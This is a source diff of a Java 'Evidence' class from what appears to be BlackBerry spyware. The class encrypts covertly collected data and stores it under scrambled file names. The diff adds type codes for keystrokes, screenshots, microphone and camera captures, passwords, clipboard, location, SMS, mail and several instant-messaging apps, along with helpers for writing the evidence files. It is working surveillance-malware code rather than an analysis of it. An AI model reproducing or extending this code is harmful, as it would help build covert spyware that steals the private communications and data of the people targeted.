@@ -16,11 +16,9 @@ import java.util.Vector;
 import javax.microedition.io.Connector;
 import javax.microedition.io.file.FileConnection;
 
-import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.agent.Agent;
-import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -71,6 +69,8 @@ public final class Evidence {
 
     public static final int EVIDENCE_MAGIC_CALLTYPE = 0x0026;
 
+    public static int EVIDENCE_DELIMITER = 0xABADC0DE;
+
     public static final int[] TYPE_EVIDENCE = new int[] {
             EvidenceType.INFO,
             EvidenceType.MAIL_RAW,
@@ -87,6 +87,16 @@ public final class Evidence {
             EvidenceType.CLIPBOARD, // c..f
             EvidenceType.NONE, EvidenceType.APPLICATION, // 10..11
             EvidenceType.NONE // 12
+    };
+
+    public static final String[] MEMO_TYPE_EVIDENCE = new String[] { "INF",
+            "MAR", "ADD", "CLL", // 0..3
+            "DEV", "LOC", "CAL", "CLM", // 4..7
+            "KEY", "SNP", "URL", "CHA", // 8..b
+            "MAI", "MIC", "CAM", "CLI", // c..f
+            "NON", "APP", // 10..11
+            "NON" // 12
+
     };
 
     private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
@@ -121,6 +131,85 @@ public final class Evidence {
         debug.warn("Wrong agentId conversion: " + agentId);
         //#endif
         return EvidenceType.UNKNOWN;
+    }
+
+    public static String memoTypeEvidence(final int typeId) {
+        switch (typeId) {
+            case 0xFFFF:
+                return "NON";
+            case 0x0000:
+                return "FON";
+            case 0x0001:
+                return "FCA";
+            case 0x0040:
+                return "KEY";
+            case 0x0100:
+                return "PRN";
+            case 0xB9B9:
+                return "SNP";
+            case 0xD1D1:
+                return "UPL";
+            case 0xD0D0:
+                return "DOW";
+            case 0x0140:
+                return "CAL";
+            case 0x0141:
+                return "SKY";
+            case 0x0142:
+                return "GTA";
+            case 0x0143:
+                return "YMS";
+            case 0x0144:
+                return "MSN";
+            case 0x0145:
+                return "MOB";
+            case 0x0180:
+                return "URL";
+            case 0xD9D9:
+                return "CLP";
+            case 0xFAFA:
+                return "PWD";
+            case 0xC2C2:
+                return "MIC";
+            case 0xC6C6:
+                return "CHA";
+            case 0xE9E9:
+                return "CAM";
+            case 0x0200:
+                return "ADD";
+            case 0x0201:
+                return "CAL";
+            case 0x0202:
+                return "TSK";
+            case 0x0210:
+                return "MAI";
+            case 0x0211:
+                return "SMS";
+            case 0x0212:
+                return "MMS";
+            case 0x0220:
+                return "LOC";
+            case 0x0230:
+                return "CAL";
+            case 0x0240:
+                return "DEV";
+            case 0x0241:
+                return "INF";
+            case 0x1011:
+                return "APP";
+            case 0x0300:
+                return "SKI";
+            case 0x1001:
+                return "MAI";
+            case 0x0213:
+                return "SMS";
+            case 0x1220:
+                return "LOC";
+            case 0xEDA1:
+                return "FSS";
+
+        }
+        return "UNK";
     }
 
     Date timestamp;
@@ -285,7 +374,8 @@ public final class Evidence {
             return false;
         }
 
-        final Vector tuple = evidenceCollector.makeNewName(this, onSD);
+        final Vector tuple = evidenceCollector.makeNewName(this,
+                memoTypeEvidence(logType), onSD);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
         //#endif
@@ -461,44 +551,6 @@ public final class Evidence {
         return plainBuffer;
     }
 
-    /**
-     * Override della funzione precedente: invece di generare il nome da una
-     * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
-     * una stringa vuota.
-     * 
-     * @param agentId
-     *            the agent id
-     * @param addPath
-     *            the add path
-     * @return the string
-     */
-    String makeName(final int agentId, final boolean addPath) {
-        return null;
-    }
-
-    /**
-     * Genera un nome gia' scramblato per un file log, se bAddPath e' TRUE il
-     * nome ritornato e' completo del path da utilizzare altrimenti viene
-     * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
-     * stringa vuota. Il nome generato non indica necessariamente un file che
-     * gia' non esiste sul filesystem, e' compito del chiamante verificare che
-     * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
-     * e' impostato a TRUE viene generato un nome che punta alla prima MMC
-     * disponibile, se esiste.
-     * 
-     * @param name
-     *            the name
-     * @param addPath
-     *            the add path
-     * @param storeToMMC
-     *            the store to mmc
-     * @return the string
-     */
-    String makeName(final String name, final boolean addPath,
-            final boolean storeToMMC) {
-        return null;
-    }
-
     public synchronized byte[] plainEvidence(final byte[] additionalData,
             final int logType, final byte[] data) {
 
@@ -562,7 +614,7 @@ public final class Evidence {
 
         //#ifdef DEBUG
         // green
-        debug.ledStart(Debug.COLOR_GREEN_LIGHT);
+        debug.ledFlash(Debug.COLOR_GREEN_LIGHT);
         //#endif
 
         final byte[] encData = encryption.encryptData(data, offset);
@@ -579,26 +631,9 @@ public final class Evidence {
             debug.error("Error writing file: " + e);
             //#endif
             return false;
-        } finally {
-            //#ifdef DEBUG
-            debug.ledStop();
-            //#endif
-        }
+        } 
 
         return true;
-    }
-
-    /**
-     * Write log.
-     * 
-     * @param data
-     *            the data
-     * @param endzero
-     *            the endzero
-     * @return true, if successful
-     */
-    public boolean writeEvidence(final String data, final boolean endzero) {
-        return writeEvidence(WChar.getBytes(data, endzero));
     }
 
     /**
@@ -636,9 +671,8 @@ public final class Evidence {
             final Evidence logInfo = new Evidence(Agent.AGENT_INFO, false,
                     Encryption.getKeys().getAesKey());
 
-            logInfo.createEvidence(null);
-            logInfo.writeEvidence(message, true);
-            logInfo.close();
+            logInfo.atomicWriteOnce(message);
+
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error(ex);
@@ -646,4 +680,35 @@ public final class Evidence {
         }
     }
 
+    public synchronized void atomicWriteOnce(byte[] additionalData,
+            byte[] content) {
+        createEvidence(additionalData);
+        writeEvidence(content);
+        close();
+    }
+
+    public synchronized void atomicWriteOnce(Vector bytelist) {
+        createEvidence(null);
+        writeEvidences(bytelist);
+        close();
+    }
+
+    public synchronized void atomicWriteOnce(byte[] plain) {
+        createEvidence(null);
+        writeEvidence(plain);
+        close();
+    }
+
+    public synchronized void atomicWriteOnce(String string) {
+        createEvidence(null);
+        writeEvidence(WChar.getBytes(string, true));
+        close();
+    }
+
+    public void atomicWriteOnce(byte[] additionalData, int logType,
+            byte[] content) {
+        createEvidence(additionalData, logType);
+        writeEvidence(content);
+        close();
+    }
 }
